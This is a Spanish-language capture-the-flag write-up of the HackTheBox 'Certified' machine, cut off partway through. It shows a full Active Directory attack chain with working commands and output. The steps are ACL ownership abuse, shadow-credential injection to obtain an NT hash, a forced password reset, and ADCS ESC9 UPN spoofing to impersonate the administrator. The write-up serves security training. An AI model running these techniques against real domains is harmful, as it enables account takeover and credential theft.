Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #certipy #esc9 #bloodhound #bloodyad #rusthound #ad #acl

![](assets/Pasted%20image%2020260115110310.png)

Credenciales iniciales: judith.mader / judith09
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ ping -c 1 10.129.63.108
PING 10.129.63.108 (10.129.63.108) 56(84) bytes of data.
64 bytes from 10.129.63.108: icmp_seq=1 ttl=127 time=114 ms

--- 10.129.63.108 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.587/113.587/113.587/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.63.108 -oG nmap/allPorts

Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
49728/tcp open  unknown          syn-ack ttl 127
49738/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49691,49692,49697,49728,49738 -sV -sC -Pn -n -vvv 10.129.63.108 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-16 00:07:03Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
| SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| uByxDydofthnDyFAiDQ/qyez4CUCAwEAAaOCAykwggMlMDgGCSsGAQQBgjcVBwQr
| MCkGISsGAQQBgjcVCIfpnVqGp+FghYmdJ4HW1CmEvYtxgWwBIQIBbgIBAjAyBgNV
| HSUEKzApBggrBgEFBQcDAgYIKwYBBQUHAwEGCisGAQQBgjcUAgIGBysGAQUCAwUw
| <MAS..>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-16T00:08:36+00:00; +7h00m03s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-16T00:08:37+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
| SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOHN
| lNrfFlfMM8vF22qiOWNOAqZy0o6xXOxCzYIaRE2gL9DIfjjQuEXY2im5VgTo4VAI
| ntc4L6xoKOzxIn8XHjXe6zdGEc/X1fxXtwTsyCknT2eZJsc3YjyaefyjYAXpLjjE
| dnhRGaadShC9lY9UNBVsfCQ8c6JNY7f+XciCgp3cDy5J09/cnpCKhW0XlFnXKx0n
| d0VyNM0B1wvU2G6823wKUZKUNzYRWzkl3L/k4Id2CxpPTV7ExOEbnIsiBJU9rijg
| <MAS..>
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-16T00:08:36+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
| SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| GA8yMTA1MDUyMzIxMDUyOVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
| ggEBAKxmajneO9wN1G0eh2Ir/K3fG2mjvtJBduOYuM2muC4YiUO9nnknPzRXbOH
| piE6bLwDeUY3DQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-16T00:08:37+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:   ac8a:4187:4d19:237f:7cfa:de61:b5b2:941f
| SHA-1: 85f1:ada4:c000:4cd3:13de:d1c2:f3c6:58f7:7134:d397
| -----BEGIN CERTIFICATE-----
| MIIGBjCCBO6gAwIBAgITeQAAAASyK000VBwyGAAAAAAABDANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAgFw0yNTA2MTEyMTA1Mjla
| <mas...>
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49728/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49738/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 61673/tcp): CLEAN (Timeout)
|   Check 2 (port 28494/tcp): CLEAN (Timeout)
|   Check 3 (port 59884/udp): CLEAN (Timeout)
|   Check 4 (port 35750/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-01-16T00:07:57
|_  start_date: N/A
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
```

Por la informacion que tenemos podemos intuir que estamos contra un `DC`.

- Puerto 88 Kerberos
- Puerto 445,139 SMB
- Puerto 135 RPC
- Puerto 636, 389 LDAP
- Puerto 5985 WinRm

## Enumeración

### Puerto 445 SMB.

Info general.

- Tenemos el dominio **certified.htb** y el nombre de la maquina `DC01`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ nxc smb 10.129.63.108
SMB         10.129.63.108   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
```

Hay que agregar lo siguiente al `/etc/hosts`:

```bash
10.129.63.108 certified.htb DC01.certified.htb DC01
```

Shares como judith.mader.

- Enumere los shares a los que tengo acceso pero no encontré nada raro.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ nxc smb certified.htb -u judith.mader -p judith09 --shares
SMB         10.129.63.108   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.63.108   445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.129.63.108   445    DC01             [*] Enumerated shares
SMB         10.129.63.108   445    DC01             Share           Permissions     Remark
SMB         10.129.63.108   445    DC01             -----           -----------     ------
SMB         10.129.63.108   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.63.108   445    DC01             C$                              Default share
SMB         10.129.63.108   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.63.108   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.63.108   445    DC01             SYSVOL          READ            Logon server share
```

### Puerto 135 RPC.

Me conecte con `rpcclient` para enumerar los usuarios:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ rpcclient -U 'judith.mader' certified.htb

Password for [WORKGROUP\judith.mader]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[judith.mader] rid:[0x44f]
user:[management_svc] rid:[0x451]
user:[ca_operator] rid:[0x452]
user:[alexander.huges] rid:[0x641]
user:[harry.wilson] rid:[0x642]
user:[gregory.cameron] rid:[0x643]
```

## Intrusion y Movimiento Lateral.

Seguí enumerando y probé algunos vectores de entrada como Kerberoasting o AS-REP Roasting pero no habia nada interesante.

Opte por utilizar `bloodhound`.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Primero necesitamos utilizar un **Ingestor**, que se va a encargar de recopilar toda la informacion. En mi caso utilice [rusthound](https://github.com/g0h4n/RustHound-CE)

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ ./rusthound-ce -d certified.htb -u judith.mader@certified.htb -z
---------------------------------------------------
Initializing RustHound-CE at 00:22:43 on 01/16/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-01-16T00:22:43Z INFO  rusthound_ce] Verbosity level: Info
[2026-01-16T00:22:43Z INFO  rusthound_ce] Collection method: All
Password:
[2026-01-16T00:22:49Z INFO  rusthound_ce::ldap] Connected to CERTIFIED.HTB Active Directory!
[2026-01-16T00:22:49Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-01-16T00:22:49Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:51Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=certified,DC=htb
[2026-01-16T00:22:51Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=certified,DC=htb
[2026-01-16T00:22:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:55Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=certified,DC=htb
[2026-01-16T00:22:55Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=certified,DC=htb
[2026-01-16T00:22:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-01-16T00:22:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=certified,DC=htb
[2026-01-16T00:22:56Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-01-16T00:22:56Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
⠄ Parsing LDAP objects: 5%                                                                                                                                                                                          [2026-01-16T00:22:56Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
[2026-01-16T00:22:56Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 10 users parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-01-16T00:22:56Z INFO  rusthound_ce::json::maker::common] .//20260116002256_certified-htb_rusthound-ce.zip created!
```

- Esto nos genera un zip que podemos importar en bloodhound.

### WriteOwner sobre Management.

Al importar la data lo primero que veo es lo siguiente:

- Mi usuario judith.mader tiene el derecho **WriteOwner** sobre el grupo Management.

![](assets/Pasted%20image%2020260115113526.png)

Este derecho me permite convertirme en dueño del "objeto" y tener control total sobre el. 

Con `bloodyad` voy a convertirme en dueño:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ bloodyAD -d certified.htb -u judith.mader -p 'judith09' --host dc01.certified.htb set owner 'CN=MANAGEMENT,CN=Users,DC=certified,DC=htb' 'judith.mader'
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on CN=MANAGEMENT,CN=Users,DC=certified,DC=htb
```

Ahora me voy otorgar el control total sobre el objeto:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ impacket-dacledit certified.htb/judith.mader:'judith09' -action write -rights FullControl -principal judith.mader -target "MANAGEMENT" -dc-ip dc01.certified.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260116-004809.bak
[*] DACL modified successfully!
```

Con el control total del objeto puedo agregarme al grupo Management.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ bloodyAD -d certified.htb -u "judith.mader" -p 'judith09' --host dc01.certified.htb add groupMember 'CN=MANAGEMENT,CN=Users,DC=certified,DC=htb' "judith.mader"
[+] judith.mader added to CN=MANAGEMENT,CN=Users,DC=certified,DC=htb
```

Y Con rpcclient lo podemos confirmar.

- 0x44f es el rid de judith.mader.

```bash
group:[Management] rid:[0x450]
rpcclient $> querygroupmem 0x450
        rid:[0x44f] attr:[0x7]
        rid:[0x451] attr:[0x7]
```

### GenericWrite sobre management_svc.

Devuelta a `bloodhound` podemos ver lo siguiente:

- El grupo Management tiene el derecho **GenericWrite** sobre el usuario **management_svc**.

![](assets/Pasted%20image%2020260115115752.png)

El permiso **GenericWrite** me permite modificar distintos atributos del objeto *usuario* en Active Directory.

En este caso, abuso de este permiso para escribir en el atributo `msDS-KeyCredentialLink`, el cual almacena **claves públicas autorizadas para autenticación Kerberos PKINIT**.  

Al añadir mi propia clave pública a este atributo, creo un método alternativo de autenticación que me permite **obtener un TGT Kerberos y autenticarme como el usuario `management_svc` sin conocer su contraseña**.

!!! tip
    **Shadow Credentials** en Active Directory es conceptualmente equivalente a añadir tu clave SSH pública en el archivo `authorized_keys` de otro usuario.

Con `pywhisker` podemos realizar el ataque:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ pywhisker -d certified.htb -u "judith.mader" -p "judith09" --target "management_svc" --action "add"

[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: b15dd209-3763-3e91-f300-3feb7a2588c7
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: OLXh3lhm.pfx
[*] Must be used with password: LA0JPsuGyPeOVbpCNOAa
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

- Esto nos genera un certificado.

Ahora con `certipy` y el certificado que generamos puedo obtener un TGT para el usuario `management_svc`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ certipy auth -pfx OLXh3lhm.pfx -password LA0JPsuGyPeOVbpCNOAa -username management_svc -domain certified.htb -dc-ip 10.129.63.108
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584
```

- Obtenemos un `ccache` file que nos sirve para autenticarnos contra kerberos.
- Obtenemos el hash NTLM `a091c1832bcdd4677c28b5a6a1295584` del usuario management_svc.

La cuenta management_svc tiene acceso por winrm y podemos obtener la flag.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ evil-winrm -i 10.129.63.108 -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'

*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
c7f5ecbaaac8ebc44b23****
```

- Dentro del sistema no encontré nada interesante.

### GenericAll sobre ca_operator.

Devuelta a `bloodhound` podemos ver lo siguiente:

- El usuario **management_svc** tiene el permiso **GenericAll** sobre el usuario **ca_operator**.

![](assets/Pasted%20image%2020260115120657.png)

El permiso **GenericAll** me da control total del objeto.

Hay distintas formas de abusar de este permiso, una de ellas es simplemente cambiando la contraseña del usuario:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ pth-net rpc password "ca_operator" "w0nder11ng@" -U "certified.htb"/"management_svc"%"aad3b435b51404eeaad3b435b51404ee":"a091c1832bcdd4677c28b5a6a1295584" -S 10.129.63.108
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

Podemos probar las nuevas credenciales para el usuario ca_operator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ nxc smb certified.htb -u ca_operator -p 'w0nder11ng@'
SMB         10.129.63.108   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.63.108   445    DC01             [+] certified.htb\ca_operator:w0nder11ng@
```

- Funcionan correctamente.

### ADCS ESC9.

Durante el movimiento lateral, revisé los certificados que cada usuario al que tenía acceso podía solicitar.  

En este proceso identifiqué que el usuario **`ca_operator`** tenía permisos para solicitar un certificado vulnerable a **ESC9**, lo que permitía suplantar identidades mediante la manipulación del UPN y autenticarse como otro usuario del dominio

- Plantilla CertifiedAuthentication vulnerable ESC9

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified]
└─$ certipy find -u ca_operator@certified.htb -p 'w0nder11ng@' -dc-ip 10.129.63.108 -stdout -vulnerable

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators                                                                                                                                                                                        CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins                                                                                                                                                   Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

ESC9 es causada gracias a que la flag `szOID_NTDS_CA_SECURITY_EXT` no esta presente en el certificado.

- Esta extensión contiene el SID del solicitante del certificado.

Lo que provoca:

- El KDC no puede vincular criptográficamente el certificado a un objeto de Active Directory
- En compatibility mode el KDC confía en el UPN del certificado.

[CertipyPrivEscWiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) nos indica los siguientes pasos para abusar de ESC9:

!!! quote
    **Con manipulación del UPN (en modo Compatibilidad o modo Deshabilitado):**
    Si un atacante tiene control sobre el atributo `userPrincipalName` de una cuenta (por ejemplo, mediante el permiso **GenericWrite**) y dicha cuenta puede inscribirse en una plantilla vulnerable a **ESC9**, el atacante puede:

    - Cambiar temporalmente el UPN de la cuenta “víctima” para que coincida con el `sAMAccountName` (o el UPN deseado) de una cuenta privilegiada objetivo (por ejemplo, un administrador).
    - Solicitar un certificado como la cuenta víctima. El certificado emitido contendrá el UPN manipulado, pero **no incluirá la extensión de seguridad SID** (debido a la vulnerabilidad ESC9).
    - Revertir el cambio de UPN en la cuenta víctima.
    - Utilizar el certificado obtenido para autenticarse. El KDC, al no encontrar una extensión SID y operar en **modo de compatibilidad**, utilizará el UPN presente en el SAN del certificado. Dado que este UPN ahora coincide con el de la cuenta privilegiada objetivo, el atacante logra **suplantar dicha cuenta**.

    **Fuente:** [CertipyPrivEscWiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)


En nuestro caso el usuario **management_svc** tiene el control total del usuario **ca_operator** gracias al permiso **GenericAll**.

Por lo cual, el primer paso consiste en modificar temporalmente el UPN del usuario `ca_operator` para que coincida con el UPN de la cuenta `administrator`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ certipy account \
    -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 \
    -dc-ip '10.129.63.108' -upn 'administrator' \
    -user 'ca_operator' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```

Ahora podemos solicitar un certificado que contendra el UPN de **administrator**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/certified/content]
└─$ certipy req \
  -u 'ca_operator@certified.htb' -p 'w0nder11ng@' \
  -dc-ip 10.129.63.108 \
  -ca certified-DC01-CA \
  -template CertifiedAuthentication

